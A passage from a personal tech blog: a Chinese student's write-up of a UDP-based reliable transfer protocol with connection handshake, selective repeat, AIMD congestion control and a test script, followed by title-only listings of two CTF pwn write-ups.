<h3 id="1-4-连接"><a href="#1-4-连接" class="headerlink" title="1.4 连接"></a>1.4 连接</h3><p>为了标识通信开始、标识通信结束、维护随机化的sbase和rbase，需要实现连接状态。<br>为了实现连接状态，需要设计连接的开始机制和结束机制。</p>
<h4 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h4><p>在建立连接时，由客户端向进入listen阶段的服务器端口发送 <code>flag |= SYN</code> 的请求建立连接的报文。同时，客户端将会随机化其 <code>sbase</code>（初始序列号），并把 <code>sbase-1</code> 发送给服务器来让服务器的 <code>rbase</code> 与其同步。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>(<span class="params">self, address</span>):</span><br><span class="line">    <span class="keyword">if</span> (self.connected):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[error] You have connected to addr <span class="subst">&#123;self.address&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># randomize init seq</span></span><br><span class="line">    self.sbase = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">    self.snext = self.sbase</span><br><span class="line">    self.spos  = self.sbase</span><br><span class="line"></span><br><span class="line">    self.address = address</span><br><span class="line">    syn_pack = make_pkt((self.sbase-<span class="number">1</span>)%<span class="number">256</span>, <span class="number">0</span>, <span class="string">b&quot;&quot;</span>, start=<span class="literal">True</span>)</span><br><span class="line">    self.udp_send(syn_pack)</span><br></pre></td></tr></table></figure>

<p>服务器端socket首先需要调用bind来绑定某一端口监听，然后调用listen进入服务器状态。服务器状态下才可以调用 <code>accept</code>。（这个设计比较愚蠢，就是为了给listen一个用途而已）</p>
<p>服务器在 <code>accpet</code> 中接收到SYN报文后，将会将其 <code>self.address</code> 更新为客户端地址，其 <code>rbase</code> 更新为 <code>seqNum + 1</code>，随机化它自己的 <code>sbase</code>，然后向客户端发送 <code>SYN | ACK</code> 报文来确认连接。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">accept</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> self.is_server):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[error] not server&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    self.udp_socket.settimeout(<span class="literal">None</span>)</span><br><span class="line">    rcvpkt, address = self.udp_socket.recvfrom(HEADER_SIZE+BUFFER_SIZE)</span><br><span class="line">    seqNum, ackNum, flag, checksum, data = analyse_pkt(rcvpkt)</span><br><span class="line">    <span class="keyword">if</span> flag &amp; SYN:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[info] SYN from&quot;</span>, address)</span><br><span class="line">        self.connected = <span class="literal">True</span></span><br><span class="line">        self.address = address</span><br><span class="line">        </span><br><span class="line">        self.rbase = (seqNum + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        self.rexpect = self.rbase</span><br><span class="line">        </span><br><span class="line">        self.sbase = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">        self.snext = self.sbase</span><br><span class="line">        self.spos  = self.sbase</span><br><span class="line"></span><br><span class="line">        synack_pack = make_pkt(self.sbase, self.rexpect, <span class="string">b&quot;&quot;</span>, start=<span class="literal">True</span>, ack=<span class="literal">True</span>)</span><br><span class="line">        self.udp_send(synack_pack)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[error] not SYN&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<p>当然，这两条特殊的报文同样要考虑丢包的问题。</p>
<p>在客户端的 <code>connect</code> 函数中，如果收不到SYN ACK，就会一直重传SYN包，直到收到 SYN ACK，如下所示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">self.udp_socket.settimeout(self.timeout)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rcvpkt = self.udp_socket.recv(HEADER_SIZE+BUFFER_SIZE)</span><br><span class="line">        seqNum, ackNum, flag, checksum, data = analyse_pkt(rcvpkt)</span><br><span class="line">        <span class="keyword">if</span> (flag &amp; SYN) <span class="keyword">and</span> (flag &amp; ACK) <span class="keyword">and</span> (ackNum == self.sbase):</span><br><span class="line">            self.connected = <span class="literal">True</span></span><br><span class="line">            self.rbase = (seqNum + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            self.rexpect = self.rbase</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> socket.timeout:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[timeout] SYN ACK&quot;</span>)</span><br><span class="line">        self.udp_send(syn_pack)</span><br></pre></td></tr></table></figure>

<p>而在服务端的 <code>accpet</code> 函数中，我没有设置重传，而是将其放在 <code>wait</code> 函数中。假设SYN ACK包丢包了，客户端会继续向其发送SYN包，而服务器此时会进入 <code>wait</code> 函数进行处理。所以在 <code>wait</code> 中，如果收到了SYN包，那么它会重新发送SYN ACK包，在这里实现重传。</p>
<h4 id="断开连接"><a href="#断开连接" class="headerlink" title="断开连接"></a>断开连接</h4><p>我设计了两种正常断开连接的方法——主动断开和被动断开。不论是服务器还是客户端，都可以主动断开或被动断开。</p>
<p>主动断开即在连接中调用 <code>close</code> 函数。<code>close</code> 会向对方发送一个FIN包（通过设置flag中的FIN bit），然后等待对方发来的FIN ACK。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> self.connected):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[info] FIN...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># send FIN</span></span><br><span class="line">    fin_pack = make_pkt(self.snext, self.rexpect, <span class="string">b&quot;&quot;</span>, stop=<span class="literal">True</span>)</span><br><span class="line">    self.udp_send(fin_pack)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># wait for FIN ACK</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>在另一方处理接收到的包的 <code>wait</code> 函数中，如果收到了FIN包，那么它会立即进入断开状态，并向其发送一个FIN ACK包。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># handle FIN</span></span><br><span class="line"><span class="keyword">elif</span> (flag &amp; FIN):</span><br><span class="line">    ack_pkt = make_pkt((self.snext-<span class="number">1</span>)%<span class="number">256</span>, self.rexpect, <span class="string">b&quot;&quot;</span>, ack=<span class="literal">True</span>, stop=<span class="literal">True</span>)</span><br><span class="line">    self.udp_send(ack_pkt)</span><br><span class="line">    self.udp_socket.settimeout(<span class="literal">None</span>)</span><br><span class="line">    self.connected = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>当然，上面两种情景也需要考虑丢包问题。<br>如果主动发送的FIN包发生丢包，也就是收不到FIN ACK，那么它就会一直重传FIN包。<br>在我的实现中，FIN ACK包只会发送一次，如果它丢包了就说明主动断开的那一方永远收不到FIN ACK了。因此，我在 <code>close</code> 函数中加入了如果超时次数超过 <code>MAX_TIMEOUT</code>，就假装自己收到了FIN ACK。从而也断开连接。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wait for FIN ACK (close函数，接上文)</span></span><br><span class="line">self.udp_socket.settimeout(self.timeout)</span><br><span class="line">timeout_count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> timeout_count &gt;= MAX_TIMEOUT:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[info] FIN...&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rcvpkt = self.udp_socket.recv(HEADER_SIZE+BUFFER_SIZE)</span><br><span class="line">        seqNum, ackNum, flag, checksum, data = analyse_pkt(rcvpkt)</span><br><span class="line">        <span class="keyword">if</span> flag &amp; FIN <span class="keyword">and</span> flag &amp; ACK <span class="keyword">and</span> ackNum == self.snext:</span><br><span class="line">            self.connected = <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[info] FIN...&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> socket.timeout:</span><br><span class="line">        timeout_count += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[timeout] FIN ACK&quot;</span>)</span><br><span class="line">        self.udp_send(fin_pack)</span><br></pre></td></tr></table></figure>

<h2 id="2-SR"><a href="#2-SR" class="headerlink" title="2 SR"></a>2 SR</h2><p>在SR中，不再使用GBN的累积确认机制，接收方会分别确认每一个收到的包，即使包提前到了也会保存并发送其ACK。此外，对于每一个已发送未确认的包，发送方都会分别维护一个时钟，当某个包的时钟超时了，发送方会单独发送那一个包（所以叫选择重传）。</p>
<p>因此，一个重点是实现（至少逻辑上）分离的时钟，另一个重点就是区分已收到和未收到的包。</p>
<h3 id="2-1-时钟"><a href="#2-1-时钟" class="headerlink" title="2.1 时钟"></a>2.1 时钟</h3><p>为了实现时钟的逻辑分离，我采用了尽量模拟的方法。我将超时间隔减小，作为类似“普朗克时间”或原子时间的概念。每次超时时，检测每个还在计时的时钟，如果他们超时了就进行重传，然后更新时钟。</p>
<p>我为我的socket添加了一个列表域 <code>self.sclkq</code>，全称为send clock queue。它将作为一个队列来使用，其每个元素都是一个 seq：timestamp 的元组。</p>
<p>当一个包（对应一个序列号）在send中被第一次发送时，它的序列号与这时的时间戳组成的元组将会被加入 <code>sclkq</code> 的队尾。如下所示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># send packets</span></span><br><span class="line"><span class="keyword">while</span> self.sbase != self.spos:</span><br><span class="line">    <span class="keyword">if</span> (self.snext - self.sbase) % <span class="number">256</span> &lt; self.window_size <span class="keyword">and</span> self.snext != self.spos:</span><br><span class="line">        pkt = make_pkt(self.snext, self.rexpect, self.sdata[self.snext])</span><br><span class="line">        self.udp_send(pkt)</span><br><span class="line">        self.sclkq.append((self.snext, time.time()))    <span class="comment"># add to clock queue</span></span><br><span class="line">        self.snext = (self.snext + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self._wait():</span><br><span class="line">            <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<p>当在wait函数中发生了基础超时，程序将会重复检查 <code>sclkq</code> 的队首，若当前时间戳与其记录的时间戳差值（也就是距离上次发送过去的时间）超过了设置的超时时间，那么程序将会重传这个序列号的包，并把该元组出列，将其序列号与当前的新时间戳构成的元组重新加入队尾。如下代码所示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">except</span> socket.timeout:</span><br><span class="line">    <span class="keyword">if</span> (recv):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check clock queue</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(self.sclkq) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> time.time() - self.sclkq[<span class="number">0</span>][<span class="number">1</span>] &gt;= self.timeout:</span><br><span class="line">            pkt = make_pkt(self.sclkq[<span class="number">0</span>][<span class="number">0</span>], self.rexpect, self.sdata[self.sclkq[<span class="number">0</span>][<span class="number">0</span>]])</span><br><span class="line">            self.udp_send(pkt)</span><br><span class="line">            self.sclkq.append((self.sclkq[<span class="number">0</span>][<span class="number">0</span>], time.time()))</span><br><span class="line">            <span class="keyword">del</span> self.sclkq[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>这样一来，就实现了发送方对每个包的单独时钟的选择重传。</p>
<h3 id="2-2-确认"><a href="#2-2-确认" class="headerlink" title="2.2 确认"></a>2.2 确认</h3><p>在SR协议中，ACK表示收到了该序列号的包，而不是累积确认，因此接收方可以提前保存并确认包。如下所示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># save data</span></span><br><span class="line"><span class="keyword">if</span> getChecksum(data) == checksum:</span><br><span class="line">    <span class="keyword">if</span> self.rdata[seqNum] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        self.rdata[seqNum] = data</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send ACK</span></span><br><span class="line">    ack_pkt = make_pkt((self.snext-<span class="number">1</span>)%<span class="number">256</span>, seqNum, <span class="string">b&quot;&quot;</span>, ack=<span class="literal">True</span>)</span><br><span class="line">    self.udp_send(ack_pkt)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># update rexpect</span></span><br><span class="line">    i = self.rexpect</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> self.rdata[i] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        self.rexpect = (self.rexpect + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        i = self.rexpect</span><br></pre></td></tr></table></figure>

<p>注意上段代码中，更新rexpect的方式并不再是简单地加一，而是一直推进到没有收到的地方。区间 $[rbase, rexpect]$ 表示<strong>连续的</strong>可以返回给上层的数据，而rexpect之后可能存在离散的收到的数据，这些数据还不能返回给上层（否则就是乱序了）。</p>
<p>而对于发送方，当接收到ACK时，采用删除其在 <code>sclkq</code> 中的元组的方式，来取消其发送。在遍历 <code>sclkq</code> 时，同时记录最早的仍在队列中的包 <code>crt_min_unacked</code>。如果 <code>crt_min_unacked</code> 和 <code>sbase</code> 不相等，则说明 <code>sbase</code> 可以更新，于是会更新后返回。代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># handle ACK</span></span><br><span class="line"><span class="keyword">if</span> (flag &amp; ACK):</span><br><span class="line">    <span class="comment"># update clock queue</span></span><br><span class="line">    crt_min_unacked = self.snext</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(self.sclkq):</span><br><span class="line">        crt = self.sclkq[i][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> ackNum == crt:</span><br><span class="line">            self.sclkq.pop(i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> (crt - self.sbase) % <span class="number">256</span> &lt; (self.snext - self.sbase) % <span class="number">256</span>:  <span class="comment"># in window</span></span><br><span class="line">                <span class="keyword">if</span> crt &lt; WINDOW_SIZE:</span><br><span class="line">                    crt += <span class="number">256</span></span><br><span class="line">                <span class="keyword">if</span> crt &lt; crt_min_unacked:</span><br><span class="line">                    crt_min_unacked = crt</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    crt_min_unacked %= <span class="number">256</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> self.sbase != crt_min_unacked:</span><br><span class="line">        self.sbase = crt_min_unacked</span><br><span class="line">        self.udp_socket.settimeout(<span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<h3 id="2-3-拥塞控制"><a href="#2-3-拥塞控制" class="headerlink" title="2.3 拥塞控制"></a>2.3 拥塞控制</h3><p>至此，SR协议已经完成了。不过我再加入了一些最基础的拥塞控制机制，也就是AIMD。</p>
<p>我通过修改 <code>self.window_size</code> 来完成拥塞控制，<code>send</code> 会根据这个变量来决定发不发送新的包。具体的修改位于 <code>wait</code> 函数中，Additive Increase位于收到ACK且更新 <code>sbase</code> 时，确认数量达到当前的 <code>self.window_size</code> 时就会将其加一，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># update window size (congestion control)</span></span><br><span class="line">self.ackcount += (crt_min_unacked - self.sbase) % <span class="number">256</span></span><br><span class="line"><span class="keyword">if</span> self.ackcount &gt;= self.window_size:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[CNG_CTRL] add window size from&#x27;</span>, self.window_size, <span class="string">&#x27;to&#x27;</span>, self.window_size+<span class="number">1</span>)</span><br><span class="line">    self.window_size += <span class="number">1</span></span><br><span class="line">    self.ackcount = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>而Multiplicative Decrease位于处理一个包超时时，每有一个包超时就会触发这个机制，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># update window size (congestion control)</span></span><br><span class="line">new_window_size = <span class="built_in">max</span>(<span class="number">2</span>, self.window_size // <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[CNG_CTRL] reduce window size from&#x27;</span>, self.window_size, <span class="string">&#x27;to&#x27;</span>, new_window_size)</span><br><span class="line">self.window_size = new_window_size</span><br></pre></td></tr></table></figure>

<h2 id="3-测试"><a href="#3-测试" class="headerlink" title="3 测试"></a>3 测试</h2><p>我编写了测试脚本用于测试客户端和服务端间连接是否可以准确传输整个图片文件，主要逻辑如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ((i=<span class="number">1</span>; i&lt;=<span class="variable">$num_runs</span>; i++)); <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">rm</span> ./server_log</span><br><span class="line">    <span class="built_in">rm</span> ./client_log</span><br><span class="line">    python ./sr_server.py 1&gt; ./server_log &amp;</span><br><span class="line">    server_pid=$!</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sleep</span> 1</span><br><span class="line"></span><br><span class="line">    python ./sr_client.py 1&gt; ./client_log</span><br><span class="line"></span><br><span class="line">    <span class="built_in">wait</span> <span class="variable">$server_pid</span></span><br><span class="line"></span><br><span class="line">    cmp -s ./server/recv.jpg ./client/data.jpg</span><br><span class="line">    <span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Test <span class="variable">$i</span>: Files match&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Test <span class="variable">$i</span>: Files do not match&quot;</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sleep</span> 4</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>不论是sr客户端与服务器，还是gbn客户端与服务器，都使用该脚本，在丢包率非0的条件下（gbn使用20%测试，sr由于赶ddl原因使用5%测试，高丢包率环境下也测试过没问题）跑过了超过200轮的测试连续正确。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一开始尝试在助教提供的实例代码上修改来做实验，但越改越复杂。由于sender和receiver是两个不同的类，因此一些函数复用起来非常烦，有的函数必须要写两遍。</p>
<p>因此我全都推倒重来，除了一些基础的函数以及思路的借鉴外，别的东西全都重新写。尤其是wait函数的复用，自认为比较简洁地实现了我的socket的全双工。</p>
<p>写完后，我对于rdt（以及TCP）的理解确实变得更深了，收获不错。虽然期末季很忙，不过还是抽了时间完成了这个PJ，幸苦自己了hhhh。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/b0d805e48d9f.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Pwn/b0d805e48d9f.html" class="post-title-link" itemprop="url">【Pwn#0x12】pwnable.tw seethefile writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-05-07 12:44:10" itemprop="dateCreated datePublished" datetime="2023-05-07T12:44:10+08:00">2023-05-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:30:39" itemprop="dateModified" datetime="2024-01-11T16:30:39+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
                </span>
            </span>

          
            <span id="/Tech/Pwn/b0d805e48d9f.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x12】pwnable.tw seethefile writeup" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Pwn/b0d805e48d9f.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/b0d805e48d9f.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这次借本题入门了glibc的FILE相关机制，果然一切涉及到函数指针的设计都是灵活但危险的。</p>
<p>本题相关：FILE伪造、vtable伪造、fclose</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/Tech/Pwn/b0d805e48d9f.html#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/9b71e71b216d.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Pwn/9b71e71b216d.html" class="post-title-link" itemprop="url">【Pwn#0x11】TAMUctf 2023 Pwnme - linked ROP chain</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-05-04 07:55:01" itemprop="dateCreated datePublished" datetime="2023-05-04T07:55:01+08:00">2023-05-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:30:39" itemprop="dateModified" datetime="2024-01-11T16:30:39+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
                </span>
            </span>

          
            <span id="/Tech/Pwn/9b71e71b216d.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x11】TAMUctf 2023 Pwnme - linked ROP chain" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
